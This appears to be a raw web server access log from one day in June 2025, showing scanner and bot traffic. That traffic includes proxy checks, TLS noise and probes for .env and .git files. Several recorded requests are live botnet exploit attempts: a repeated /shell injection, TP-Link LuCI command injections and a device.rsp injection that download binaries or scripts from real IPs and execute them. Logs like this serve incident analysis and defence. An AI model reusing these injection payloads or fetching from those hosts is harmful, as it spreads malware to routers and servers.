199.204.97.58 - - [19/Jun/2025:11:29:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:11:42:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
164.52.24.179 - - [19/Jun/2025:11:43:20 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03Q\xF1{\xD2\x1D\xF5\xC8\x87\x81\xD7\xEE\x96F\x09\x15\xDC\xAFD &7\xF1\x00$J\x1E\xEE\xF0\x8F\x89\xB70 V\xBD\x1E\x06\xF3YV\xB4\xB8b" 400 157 "-" "-"
164.52.24.179 - - [19/Jun/2025:11:43:20 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [19/Jun/2025:11:43:23 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [19/Jun/2025:11:43:27 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
164.52.24.179 - - [19/Jun/2025:11:43:31 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
185.218.84.178 - - [19/Jun/2025:11:44:55 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:11:56:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:12:03:30 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:12:09:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
65.49.1.37 - - [19/Jun/2025:12:13:28 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x14:A\x9F\x041NC&d\xBE\xE2\xD3\xC5\x12\x96\x22$\xE9\xD1I\xFF/\x09s[\x13\x90\xF1\xF4Dv\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:12:23:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
164.92.240.5 - - [19/Jun/2025:12:24:50 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
164.92.240.5 - - [19/Jun/2025:12:24:50 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "http://szoy.smwlkj.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
164.92.240.5 - - [19/Jun/2025:12:24:51 +0000] "GET /ads.txt HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:12:36:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
176.96.131.92 - - [19/Jun/2025:12:49:02 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
199.204.97.58 - - [19/Jun/2025:12:50:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:13:03:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.212 - - [19/Jun/2025:13:15:42 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:13:17:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:13:30:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
185.218.84.178 - - [19/Jun/2025:13:38:56 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:13:57:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:14:04:00 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
144.172.100.214 - - [19/Jun/2025:14:09:12 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F160.187.246.30%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk HTTP/1.1" 500 6870 "-" "Mozilla/5.0"
199.204.97.58 - - [19/Jun/2025:14:11:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:14:21:11 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:14:24:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
81.163.40.32 - - [19/Jun/2025:14:29:26 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
204.76.203.219 - - [19/Jun/2025:14:29:54 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
204.76.203.219 - - [19/Jun/2025:14:30:44 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
59.82.21.39 - - [19/Jun/2025:14:36:02 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.6165.90 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:14:38:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.255.162.250 - - [19/Jun/2025:14:39:34 +0000] "GET / HTTP/1.1" 500 6870 "-" "Hello World"
107.173.63.224 - - [19/Jun/2025:14:43:06 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
111.7.96.151 - - [19/Jun/2025:14:47:13 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.64.1"
125.122.33.110 - - [19/Jun/2025:14:48:06 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:14:51:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:15:05:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
185.194.204.246 - - [19/Jun/2025:15:09:33 +0000] "\x16\x03\x01\x01\x9A\x01\x00\x01\x96\x03\x03;\xDA\xD1fK\x80\x93\x8F\xC5IRU>\xE4]1\xE6\xE7y\xF3\xDD5\xCC\x97Z\xA2\xB5\xC1\xCAY_\x84 \x9FQ\xA9\x8D\xCD\xDE\x1C\xCD\xC4\x15\x95\xBE;\xDEFS\xAF\xC2\xEC\xD8\x89q3\xB9x\xD8\xB53\x22K)\xD5\x00\xC2\x13\x01\x13\x02\x13\x03\x13\x04\x13\x05\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0S\x00\xA7\xC0+\xC0/\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0R\x00\xA6\xC0$\xC0(\x00k\xC0s\xC0w\x00\xC4\x00m\x00\xC5\xC0#\xC0'\x00g\xC0r\xC0v\x00\xBE\x00l\x00\xBF\xC0" 400 157 "-" "-"
64.23.163.195 - - [19/Jun/2025:15:13:17 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x99`\xE2E\xCB\x9Eh\xB5\xC7\xD9\x0C\xE5/\xC3\xF0or\x0FC1\x15\x0C\xFER\x92\xE6\x82a\xF1\xB6%\xA0\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
64.23.163.195 - - [19/Jun/2025:15:13:17 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xF9\x8C\xAD\xC1\xBE\xDDg\x1D\xEE\xCE\xDFjj\xD57\xC8\xC6\x905\x12\x07S\xCDNxj\xF5*V\x16rt\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
64.23.163.195 - - [19/Jun/2025:15:13:17 +0000] "GET /upl.php HTTP/1.1" 404 27 "-" "Mozilla/5.0"
64.23.163.195 - - [19/Jun/2025:15:13:18 +0000] "GET /t4 HTTP/1.1" 500 6864 "-" "Mozilla/5.0"
64.23.163.195 - - [19/Jun/2025:15:13:18 +0000] "GET /geoip/ HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.163.195 - - [19/Jun/2025:15:13:18 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.163.195 - - [19/Jun/2025:15:13:19 +0000] "GET /1.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.163.195 - - [19/Jun/2025:15:13:19 +0000] "GET /systembc/password.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.163.195 - - [19/Jun/2025:15:13:19 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03I\x8C\xC8\xE2Y<\x96\xEC)\xB5\x0F\x1D\xDA\xD3\xECs\x5C\x10\x99pW\x93\xEC\x96\xE0q\xAE" 400 157 "-" "-"
64.23.163.195 - - [19/Jun/2025:15:13:21 +0000] "GET /form.html HTTP/1.1" 500 6870 "-" "curl/8.1.2"
64.23.163.195 - - [19/Jun/2025:15:13:21 +0000] "GET /password.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.62.122.56 - - [19/Jun/2025:15:15:27 +0000] "GET /.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
178.62.122.56 - - [19/Jun/2025:15:15:27 +0000] "GET /.git/config HTTP/1.1" 500 6870 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
196.251.116.155 - - [19/Jun/2025:15:17:32 +0000] "GET /.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.11.83 - - [19/Jun/2025:15:18:30 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:15:18:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
185.218.84.178 - - [19/Jun/2025:15:26:28 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:15:32:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.255.162.250 - - [19/Jun/2025:15:33:41 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [19/Jun/2025:15:38:40 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:15:45:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:15:48:51 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:15:59:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
93.174.93.12 - - [19/Jun/2025:16:05:28 +0000] "GET / HTTP/1.0" 500 6851 "-" "Mozilla/5.0 (Linux; Android 9; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
199.204.97.58 - - [19/Jun/2025:16:12:44 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
87.121.84.34 - - [19/Jun/2025:16:15:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh) HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
87.121.84.34 - - [19/Jun/2025:16:15:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh) HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
204.76.203.219 - - [19/Jun/2025:16:16:44 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
141.98.11.83 - - [19/Jun/2025:16:17:54 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
43.166.245.120 - - [19/Jun/2025:16:22:54 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
199.204.97.58 - - [19/Jun/2025:16:26:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:16:39:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:16:44:45 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:16:53:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:16:54:10 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:17:06:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:17:11:04 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
185.218.84.178 - - [19/Jun/2025:17:20:03 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:17:20:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
196.251.116.162 - - [19/Jun/2025:17:24:26 +0000] "GET /.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
204.76.203.219 - - [19/Jun/2025:17:25:12 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:17:33:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:17:41:15 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:17:47:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
87.255.194.135 - - [19/Jun/2025:17:51:01 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 500 6851 "-" "xfa1"
45.135.194.34 - - [19/Jun/2025:17:56:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%24%28killall%20-9%20mipsel%20mpsl%3B%28wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox%20wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%29%20%7C%20sh%20-s%20tplink%3B%29 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:18:00:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
43.152.72.244 - - [19/Jun/2025:18:04:38 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.98.11.83 - - [19/Jun/2025:18:08:12 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
204.76.203.219 - - [19/Jun/2025:18:09:36 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:18:14:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
125.88.198.130 - - [19/Jun/2025:18:20:02 +0000] "GET / HTTP/1.0" 500 6851 "-" "-"
125.88.198.130 - - [19/Jun/2025:18:20:04 +0000] "HEAD / HTTP/1.1" 500 0 "-" "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/86.0.4240.111Safari/537.36"
125.88.198.130 - - [19/Jun/2025:18:20:04 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/86.0.4240.111Safari/537.36"
125.88.198.130 - - [19/Jun/2025:18:20:14 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x22\xF8\x1D\x1D\x03\xAC#\xB3\x09\xCD9\x89\xA4\x04s\xFF\x95{2\xFE\x031" 400 157 "-" "-"
125.88.198.130 - - [19/Jun/2025:18:20:14 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x030g\xA2\xB2\xAF\x07\x06\x8B\xC9\x9B\xB2\xB6\x1C\xC2\xDC\x1D\xD2c\x9CtlC@w\xD7\xD9\x9F\xCA\x0E\xD3\x0C\xE4\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 157 "-" "-"
198.235.24.16 - - [19/Jun/2025:18:24:15 +0000] "GET / HTTP/1.0" 500 6851 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
199.204.97.58 - - [19/Jun/2025:18:27:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:18:34:04 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:18:41:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:18:49:11 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:18:54:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:19:01:39 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:19:08:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
37.60.241.154 - - [19/Jun/2025:19:17:46 +0000] "SSH-2.0-OpenSSH" 400 157 "-" "-"
147.185.132.174 - - [19/Jun/2025:19:20:10 +0000] "GET / HTTP/1.0" 500 6851 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
204.76.203.219 - - [19/Jun/2025:19:20:26 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
185.218.84.178 - - [19/Jun/2025:19:20:45 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:19:21:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:19:29:05 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.11.83 - - [19/Jun/2025:19:30:25 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:19:35:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:19:48:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:20:02:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:20:02:55 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
204.76.203.219 - - [19/Jun/2025:20:10:50 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:20:15:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
45.135.193.67 - - [19/Jun/2025:20:16:18 +0000] "GET / HTTP/1.1" 500 6864 "-" "-"
121.132.37.40 - - [19/Jun/2025:20:26:59 +0000] "GET / HTTP/1.0" 500 6851 "-" "curl/7.88.1"
141.98.11.83 - - [19/Jun/2025:20:27:11 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
45.135.193.67 - - [19/Jun/2025:20:27:45 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
199.204.97.58 - - [19/Jun/2025:20:29:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
185.242.226.12 - - [19/Jun/2025:20:33:04 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03\xBD\xA4\xAE\xEE\xC7Wj\xED\xCA\x1A\xCE\x86E:\x05\x87\xD8\xAERv\x7F\xEE\xA6r4\x03U7\xA5m\x8E2\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
204.76.203.219 - - [19/Jun/2025:20:37:34 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:20:42:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
198.235.24.173 - - [19/Jun/2025:20:46:47 +0000] "GET / HTTP/1.1" 500 6870 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
196.251.80.2 - - [19/Jun/2025:20:53:41 +0000] "GET /.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
141.98.11.83 - - [19/Jun/2025:20:55:48 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:20:56:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
149.50.103.48 - - [19/Jun/2025:21:00:50 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:21:09:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
45.135.194.34 - - [19/Jun/2025:21:12:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%24%28killall%20-9%20mipsel%20mpsl%3B%28wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox%20wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%29%20%7C%20sh%20-s%20tplink%3B%29 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
204.76.203.219 - - [19/Jun/2025:21:12:46 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
141.98.11.83 - - [19/Jun/2025:21:20:43 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:21:23:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
80.82.77.202 - - [19/Jun/2025:21:26:43 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
